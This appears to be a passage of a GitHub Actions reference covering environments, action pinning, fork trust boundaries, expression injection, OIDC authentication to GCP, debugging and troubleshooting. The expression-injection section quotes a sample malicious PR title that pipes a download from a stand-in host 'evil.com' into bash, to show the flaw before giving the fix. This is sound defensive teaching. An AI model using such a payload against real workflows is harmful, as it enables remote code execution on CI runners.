### GitHub Actions | concurrency | serialization

For deployments, use concurrency without `cancel-in-progress` to serialize runs (queue instead of cancel):

```yaml
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

## Environments

### GitHub Actions | environments | protection rules

Use this pattern when gating deployments behind human approval, wait timers, or branch restrictions. The operational goal is to prevent accidental production deployments and enforce deployment policies.

*Deploy through staging (no protection) and production (required reviewer).*

```yaml
name: "Demo: Environments"
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - name: Deploy to staging
        run: |
          echo "Environment: staging"
          echo "No protection rules — deploys immediately."
          echo "DEMO_REGION: ${{ vars.DEMO_REGION }}"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://production.example.com
    steps:
      - name: Deploy to production
        run: |
          echo "Environment: production"
          echo "This environment has required reviewers."
```

*Workflow run output (run #1 — staging deployed immediately, production waited for approval):*

```text
=== Deploying to staging ===
Environment: staging
No protection rules — deploys immediately.
DEMO_REGION: europe-west1
Evaluated environment url: https://staging.example.com

=== Deploying to production ===
Environment: production
This environment has required reviewers.
The workflow paused until an authorized reviewer approved.
Evaluated environment url: https://production.example.com
```

#### Set up environments via GitHub API

*Create the staging environment (no protection).*

```bash
gh api repos/alp78/git-lab/environments/staging -X PUT --input - <<'EOF'
{}
EOF
```

*Create the production environment with required reviewer.*

```bash
gh api repos/alp78/git-lab/environments/production -X PUT --input - <<'EOF'
{
  "reviewers": [
    {
      "type": "User",
      "id": 37634801
    }
  ]
}
EOF
```

*Set an environment-level variable.*

```bash
gh variable set DEMO_REGION -R alp78/git-lab --env staging --body "europe-west1"
```

| Protection rule | Description |
|----------------|-------------|
| **Required reviewers** | Up to 6 users/teams must approve before the job runs |
| **Wait timer** | Delay in minutes before the job starts after approval |
| **Deployment branches** | Restrict which branches can deploy to the environment |
| **Custom rules** | GitHub App-based custom deployment protection rules |

## Security Fundamentals

### GitHub Actions | security | pinning actions to SHA

> [!danger] Mutable tags are a supply-chain risk
>
> `uses: actions/checkout@v4` resolves to whatever commit `v4` currently points to. If the action maintainer's account is compromised, `v4` can be repointed to malicious code. This has happened in real attacks (e.g., the `tj-actions/changed-files` compromise).

> [!success] Pin to full commit SHA
>
> ```yaml
> - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4.2.2
> ```
> The SHA is immutable — it cannot be changed after publishing. Add the version as a comment for human readability. Use tools like Dependabot or Renovate to automate SHA updates.

### GitHub Actions | security | fork PR trust boundaries

| Trigger | Code source | Secrets available? | Write permissions? |
|---------|-------------|-------------------|-------------------|
| `pull_request` (same repo) | Merge commit | Yes | Per `permissions:` |
| `pull_request` (fork) | Merge commit | **No** | **No** |
| `pull_request_target` | Base branch | Yes | Yes |
| `workflow_run` | Default branch | Yes | Yes |

### GitHub Actions | security | expression injection

> [!danger] Interpolating untrusted values in shell commands is command injection
>
> ```yaml
> # DANGEROUS — PR title could contain: '; curl evil.com | bash; echo '
> run: echo "PR title: ${{ github.event.pull_request.title }}"
> ```
> The expression is substituted before bash runs, so shell metacharacters in the PR title execute as commands.

> [!success] Use environment variables for untrusted data
>
> ```yaml
> env:
>   PR_TITLE: ${{ github.event.pull_request.title }}
> run: echo "PR title: $PR_TITLE"
> ```
> Shell variables are not expanded by bash the same way — `$PR_TITLE` is treated as a single string value, not interpreted as shell code.

### GitHub Actions | security | OIDC fundamentals

**What problem OIDC solves:** Traditional cloud authentication requires storing long-lived service account keys as GitHub secrets. If a secret leaks (in logs, to a fork, via a compromised action), the attacker has permanent access until the key is rotated.

**How OIDC works:**

1. The workflow requests an OIDC token from GitHub (`id-token: write` permission).
2. GitHub mints a short-lived JWT containing claims about the workflow (repo, branch, actor, environment).
3. The cloud provider (GCP, AWS, Azure) validates the JWT against its trust policy and issues a short-lived access token.
4. No long-lived secrets are stored anywhere.

#### Set up OIDC between GitHub and GCP

*Create a Workload Identity Pool and OIDC provider in GCP.*

```bash
# Create the Workload Identity Pool
gcloud iam workload-identity-pools create "github-actions" \
  --project="bq-wh-nb" \
  --location="global" \
  --display-name="GitHub Actions"
```

```text
Created workload identity pool [github-actions].
```

*Create the OIDC provider with attribute mapping and owner condition.*

```bash
gcloud iam workload-identity-pools providers create-oidc "github" \
  --project="bq-wh-nb" \
  --location="global" \
  --workload-identity-pool="github-actions" \
  --display-name="GitHub" \
  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository,attribute.repository_owner=assertion.repository_owner" \
  --attribute-condition="assertion.repository_owner == 'alp78'" \
  --issuer-uri="https://token.actions.githubusercontent.com"
```

```text
Created workload identity pool provider [github].
```

*Create a dedicated service account and bind it to the WIF pool.*

```bash
# Create service account
gcloud iam service-accounts create github-actions-sa \
  --project=bq-wh-nb \
  --display-name="GitHub Actions (git-lab)"

# Grant BigQuery read permissions
gcloud projects add-iam-policy-binding bq-wh-nb \
  --member="serviceAccount:github-actions-sa@bq-wh-nb.iam.gserviceaccount.com" \
  --role="roles/bigquery.dataViewer"

gcloud projects add-iam-policy-binding bq-wh-nb \
  --member="serviceAccount:github-actions-sa@bq-wh-nb.iam.gserviceaccount.com" \
  --role="roles/bigquery.jobUser"

# Allow WIF pool to impersonate the SA (restricted to alp78/git-lab)
gcloud iam service-accounts add-iam-policy-binding \
  github-actions-sa@bq-wh-nb.iam.gserviceaccount.com \
  --project=bq-wh-nb \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/348557092514/locations/global/workloadIdentityPools/github-actions/attribute.repository/alp78/git-lab"
```

*Enable required GCP APIs.*

```bash
gcloud services enable iamcredentials.googleapis.com --project=bq-wh-nb
gcloud services enable sts.googleapis.com --project=bq-wh-nb
```

*Store the WIF provider and SA email as GitHub secrets.*

```bash
gh secret set GCP_WORKLOAD_IDENTITY_PROVIDER -R alp78/git-lab \
  --body "projects/348557092514/locations/global/workloadIdentityPools/github-actions/providers/github"

gh secret set GCP_SERVICE_ACCOUNT -R alp78/git-lab \
  --body "github-actions-sa@bq-wh-nb.iam.gserviceaccount.com"

gh secret set GCP_PROJECT_ID -R alp78/git-lab \
  --body "bq-wh-nb"
```

*OIDC workflow — authenticate to GCP and run BigQuery queries.*

```yaml
name: "Demo: OIDC GCP Authentication"
on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/demo-oidc-gcp.yml"
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  gcp-auth:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate to GCP via OIDC
        id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
          service_account: ${{ secrets.GCP_SERVICE_ACCOUNT }}

      - name: Set up gcloud CLI
        uses: google-github-actions/setup-gcloud@v2

      - name: Verify authentication
        run: |
          echo "Project: $(gcloud config get-value project)"
          echo "Account: $(gcloud auth list --filter=status:ACTIVE --format='value(account)')"

      - name: BigQuery dry-run validation
        run: |
          bq query \
            --use_legacy_sql=false \
            --dry_run \
            'SELECT table_id, row_count, size_bytes
             FROM `bq-wh-nb.stoxx_bronze.__TABLES__`
             LIMIT 10'

      - name: BigQuery actual query
        run: |
          bq query \
            --use_legacy_sql=false \
            --format=prettyjson \
            --max_rows=5 \
            'SELECT
               table_id,
               row_count,
               ROUND(size_bytes / 1024 / 1024, 2) AS size_mb
             FROM `bq-wh-nb.stoxx_bronze.__TABLES__`
             ORDER BY row_count DESC
             LIMIT 5'
```

*Workflow run output (run #3, triggered by workflow_dispatch):*

```text
=== OIDC Authentication ===
Project: bq-wh-nb
Account: ***

OIDC means no long-lived service account keys.
GitHub mints a short-lived JWT, GCP exchanges it for a token.

=== BigQuery dry-run ===
Running a dry-run query to validate SQL without cost...
Query successfully validated. Assuming the tables are not modified,
running this query will process 0 bytes of data.

=== BigQuery live query ===
Waiting on bqjob_r5215c3ef6e9cbc1a_0000019d82c3a3be_1 ... (0s) Current status: DONE
[
  {"row_count": "29335", "size_mb": "1.73", "table_id": "trading_calendar"},
  {"row_count": "212",   "size_mb": "0.0",  "table_id": "dim_country"},
  {"row_count": "169",   "size_mb": "0.03", "table_id": "signals_daily"},
  {"row_count": "169",   "size_mb": "0.03", "table_id": "signals_quarterly"},
  {"row_count": "169",   "size_mb": "0.27", "table_id": "index_dim"}
]
```

## Actions Ecosystem

### GitHub Actions | actions | reusable workflows vs composite vs JS/Docker

| Type | Defined in | Caller syntax | Runs on | Inputs | Can access `secrets`? |
|------|-----------|---------------|---------|--------|----------------------|
| **Reusable workflow** | `.github/workflows/*.yml` with `on: workflow_call` | `jobs.<id>.uses:` | Separate runner (new VM) | `with:` + `secrets:` | Yes (must be passed) |
| **Composite action** | `action.yml` with `runs.using: composite` | `steps[].uses:` | Same runner as caller | `with:` | Yes (via env) |
| **JavaScript action** | `action.yml` with `runs.using: node20` | `steps[].uses:` | Same runner as caller | `with:` | Yes (via env) |
| **Docker action** | `action.yml` with `runs.using: docker` | `steps[].uses:` | Same runner (container) | `with:` | Yes (via env) |

Use a reusable workflow when whole job graphs or pipeline templates must be shared across repositories or standardized across teams.
Use a composite action when you need to reuse a fixed sequence of same-runner steps such as setup, build, or test orchestration.
Use a JavaScript or Docker action when the logic needs its own packaged runtime, dependencies, or container image.

### GitHub Actions | actions | action.yml metadata basics

Every action has an `action.yml` (or `action.yaml`) that declares its inputs, outputs, and execution method.

```yaml
# action.yml (composite action example)
name: "Setup Python Project"
description: "Install Python, restore cache, install dependencies"
inputs:
  python-version:
    description: "Python version"
    required: false
    default: "3.12"
runs:
  using: composite
  steps:
    - uses: actions/setup-python@v5
      with:
        python-version: ${{ inputs.python-version }}
    - shell: bash
      run: pip install -r requirements.txt
```

## Debugging and Observability

### GitHub Actions | debugging | reading logs

Workflow run logs are available via the GitHub UI (`Actions` tab) and the CLI. Step-level logs are grouped and expandable.

```bash
# List recent runs
gh run list -R alp78/git-lab --limit 10

# View a specific run summary
gh run view 24312297713 -R alp78/git-lab

# View full step-level logs
gh run view 24312297713 -R alp78/git-lab --log

# View a specific job's logs
gh run view --job=70983934563 -R alp78/git-lab --log
```

### GitHub Actions | debugging | enabling debug logging

**Method 1 — Re-run with debug:** In the GitHub UI, click "Re-run jobs" and check "Enable debug logging." This sets `ACTIONS_RUNNER_DEBUG=true` and `ACTIONS_STEP_DEBUG=true`.

**Method 2 — Repository secret:** Set a secret named `ACTIONS_STEP_DEBUG` with value `true`. This enables debug logging for all runs.

### GitHub Actions | debugging | workflow commands and annotations

```yaml
- name: Annotations and grouping
  run: |
    echo "::notice::This is a notice annotation"
    echo "::warning::This is a warning annotation"
    echo "::error::This is an error annotation"
    echo "::group::Grouped output section"
    echo "Line 1 inside group"
    echo "Line 2 inside group"
    echo "::endgroup::"
```

Annotations appear as decorations on the workflow run summary and in PR checks.

### GitHub Actions | debugging | inspecting contexts safely

```yaml
- name: Dump runner context
  run: echo '${{ toJSON(runner) }}'
```

```text
{
  "os": "Linux",
  "arch": "X64",
  "name": "GitHub Actions 1000000635",
  "environment": "github-hosted",
  "tool_cache": "/opt/hostedtoolcache",
  "temp": "/home/runner/work/_temp",
  "workspace": "/home/runner/work/git-lab"
}
```

> [!danger] Never dump the secrets context
>
> `echo '${{ toJSON(secrets) }}'` will log all secret names (values are masked, but the keys leak). Secret names can reveal infrastructure details.

> [!success] Dump only non-sensitive contexts
>
> Safe to dump: `github`, `runner`, `env`, `vars`, `matrix`, `inputs`, `needs`, `steps`. Never dump: `secrets`.

### GitHub Actions | debugging | local testing with act

[`act`](https://github.com/nektos/act) runs GitHub Actions workflows locally using Docker. It is useful for rapid iteration but has significant limitations:

| Feature | `act` | Real GitHub |
|---------|-------|-------------|
| Service containers | Limited | Full support |
| OIDC tokens | Not available | Available |
| Secrets | From `.secrets` file | Encrypted in GitHub |
| `GITHUB_TOKEN` | Personal access token | Auto-generated |
| Runner images | Simplified Docker images | Full VM images |
| Caching | Not supported | `actions/cache` works |
| `workflow_run` | Not supported | Works |

Use `act` for quick syntax checks and basic step validation. Always validate critical workflows on real GitHub-hosted runners.

## Data-Engineering Examples

### GitHub Actions | data-engineering | BigQuery OIDC auth

The OIDC workflow in the Security Fundamentals section demonstrates end-to-end GCP authentication from GitHub Actions, including BigQuery dry-run validation and live queries against the `stoxx_bronze` dataset. This is the preferred pattern for all data-engineering workflows that interact with GCP — no long-lived service account keys needed.

### GitHub Actions | data-engineering | service containers for databases

The service container demo in the Jobs section shows how to run PostgreSQL as a sidecar for integration testing. This pattern applies directly to data-engineering scenarios:

- **Migration testing:** Run schema migrations against a real database, verify with `pg_isready` health checks
- **SQL validation:** Execute validation queries against test data to catch errors before deploying to production
- **Pipeline testing:** Run pipeline code that inserts and queries data, verifying end-to-end correctness

### GitHub Actions | data-engineering | artifact patterns

Common data-engineering artifacts:

| Artifact type | Upload from | Download in | Retention |
|--------------|-------------|-------------|-----------|
| Test reports | CI job | Deploy job (gatekeeping) | 30 days |
| dbt manifest | `dbt compile` job | Documentation job | 5 days |
| SQL migration plan | `plan` job | `apply` job (approval gate) | 5 days |
| Coverage reports | Test job | Summary/reporting | 30 days |
| Cost estimation | BQ dry-run job | PR comment job | 5 days |

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| Workflow not triggered | Path filter excludes all changed files | Check `paths:` filter matches your changes |
| `pull_request` skipped on fork PR | Fork PRs have limited permissions | Use `pull_request_target` for trusted operations only |
| Secrets empty in fork PR | Security: secrets not exposed to forks | Pass non-sensitive config via `vars` instead |
| `GITHUB_TOKEN` 403 error | Missing permission scope | Add the required scope to `permissions:` block |
| Cache miss every run | Key includes a value that changes each run (e.g., timestamp) | Use `hashFiles()` of a lockfile for stable keys |
| Cache not shared across branches | Cache scoped to branch + ancestors | Create base cache on main first |
| Service container not ready | Health check failing or missing | Add `--health-cmd`, `--health-interval`, `--health-retries` options |
| `continue-on-error` hiding failures | Job-level flag masks real errors | Use step-level `continue-on-error` with explicit outcome checks |
| Matrix generates wrong combinations | `include`/`exclude` logic is order-dependent | Use `exclude` for removing; `include` adds or extends |
| Schedule workflow disabled | Repo inactive for 60+ days | Push any commit to re-enable; add `workflow_dispatch` as backup trigger |
| Expression injection vulnerability | Untrusted values in `${{ }}` interpolated into `run:` | Pass untrusted values through `env:` instead |
| OIDC authentication fails | IAM Credentials API not enabled or SA binding missing | Enable `iamcredentials.googleapis.com` and check WIF pool binding |
| `workflow_run` not triggered | Watched workflow name doesn't match exactly | Use the exact `name:` string from the triggering workflow |
| Concurrency cancels wanted runs | `cancel-in-progress: true` on a shared group | Use more specific group names (include branch, PR number, or environment) |
| Reusable workflow fails to find caller secrets | Secrets not passed via `secrets:` key | Explicitly pass each secret or use `secrets: inherit` |

## Operating Guidance

1. **Always set `permissions:`** — every workflow should declare explicit, least-privilege permissions.
2. **Pin actions to full SHA** — never use mutable tags for third-party actions in production workflows.
3. **Set `timeout-minutes:`** — every job should have an explicit timeout. The default (360 min) wastes runner time on stuck jobs.
4. **Use `concurrency:` on CI workflows** — cancel in-progress runs on the same branch to avoid wasted compute.
5. **Pass secrets through `env:`** — never interpolate `${{ secrets.* }}` directly in `run:` commands.
6. **Use OIDC for cloud auth** — prefer Workload Identity Federation over stored service account keys.
7. **Test scheduled workflows manually** — always add `workflow_dispatch` alongside `schedule` triggers.
8. **Check `continue-on-error` carefully** — use step-level, not job-level. Always check `outcome` in subsequent steps.
9. **Validate fork PR trust boundaries** — understand which triggers expose secrets and which don't.
10. **Keep workflow files small and focused** — prefer reusable workflows and composite actions over monolithic YAML files.

## Quick Reference

| Task | YAML/Command |
|------|--------------|
| Trigger on push to main | `on: push: branches: [main]` |
| Trigger on PR | `on: pull_request: branches: [main]` |
| Manual trigger | `on: workflow_dispatch:` |
| Schedule (hourly) | `on: schedule: - cron: "0 * * * *"` |
| Set permissions | `permissions: contents: read` |
| Use an action | `uses: actions/checkout@v4` |
| Run a shell command | `run: echo "hello"` |
| Set step output | `echo "key=value" >> "$GITHUB_OUTPUT"` |
| Set dynamic env var | `echo "KEY=value" >> "$GITHUB_ENV"` |
| Write job summary | `echo "# Title" >> "$GITHUB_STEP_SUMMARY"` |
| Access secret | `${{ secrets.MY_SECRET }}` |
| Access config var | `${{ vars.MY_VAR }}` |
| Access step output | `${{ steps.<id>.outputs.<key> }}` |
| Access job output | `${{ needs.<job>.outputs.<key> }}` |
| Matrix strategy | `strategy: matrix: python: ["3.11", "3.12"]` |
| Job dependency | `needs: [lint, test]` |
| Conditional step | `if: ${{ github.ref == 'refs/heads/main' }}` |
| Continue on error | `continue-on-error: true` |
| Job timeout | `timeout-minutes: 10` |
| Concurrency cancel | `concurrency: group: ${{ github.ref }}` + `cancel-in-progress: true` |
| Upload artifact | `uses: actions/upload-artifact@v4` + `with: name: + path:` |
| Download artifact | `uses: actions/download-artifact@v4` + `with: name:` |
| Cache dependencies | `uses: actions/cache@v4` + `with: path: + key:` |
| Service container | `services: postgres: image: postgres:16` |
| Environment gate | `environment: name: production` |
| Reusable workflow | `jobs.<id>.uses: ./.github/workflows/<file>@<ref>` |
| OIDC auth (GCP) | `uses: google-github-actions/auth@v2` + `id-token: write` |
| Debug annotation | `echo "::warning::message"` |
| List runs (CLI) | `gh run list -R owner/repo` |
| View run logs (CLI) | `gh run view <id> --log` |
| Trigger dispatch (CLI) | `gh workflow run <name> -f key=value` |

## References

- [GitHub Actions documentation](https://docs.github.com/en/actions)
- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows)
- [Contexts reference](https://docs.github.com/en/actions/learn-github-actions/contexts)
- [Expressions reference](https://docs.github.com/en/actions/learn-github-actions/expressions)
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Using OpenID Connect with GitHub Actions](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [Encrypted secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets)
- [Using environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)
- [Caching dependencies](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows)
- [google-github-actions/auth](https://github.com/google-github-actions/auth)
